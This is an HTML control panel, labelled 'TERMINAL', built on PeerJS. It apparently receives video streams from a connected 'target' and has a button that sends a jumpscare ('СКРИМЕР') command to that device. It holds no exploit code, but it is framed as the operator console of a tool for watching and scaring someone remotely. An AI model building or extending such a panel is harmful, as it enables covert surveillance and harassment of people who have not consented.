<!DOCTYPE html>
<html>
<head>
    <title>TERMINAL v10.0</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
        #side { width: 280px; background: #0a0a0a; border-right: 1px solid #222; padding: 20px; }
        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; overflow-y: auto; }
        video { width: 100%; border: 1px solid #333; border-radius: 5px; background: #000; }
        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; }
        .btn:hover { background: #0f0; color: #000; }
    </style>
</head>
<body>
    <div id="side">
        <h2 style="color: #ff0050;">TERMINAL</h2>
        <div id="status" style="margin-bottom: 20px;">ОЖИДАНИЕ...</div>
        <button class="btn" onclick="send('SCR')" style="color:#ff0050; border-color:#ff0050;">💀 СКРИМЕР</button>
    </div>
    <div id="monitor"></div>

    <script>
        const MY_ID = '09062012';
        const peer = new Peer(MY_ID);
        let activeConn = null;

        peer.on('open', () => document.getElementById('status').innerText = "СИСТЕМА ГОТОВА");

        peer.on('connection', conn => {
            activeConn = conn;
            document.getElementById('status').innerText = "ЦЕЛЬ ПОДКЛЮЧЕНА";
        });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                const video = document.createElement('video');
                video.autoplay = true;
                video.srcObject = stream;
                document.getElementById('monitor').appendChild(video);
            });
        });

        function send(t) { if(activeConn) activeConn.send({ type: t }); }
    </script>
</body>
</html>
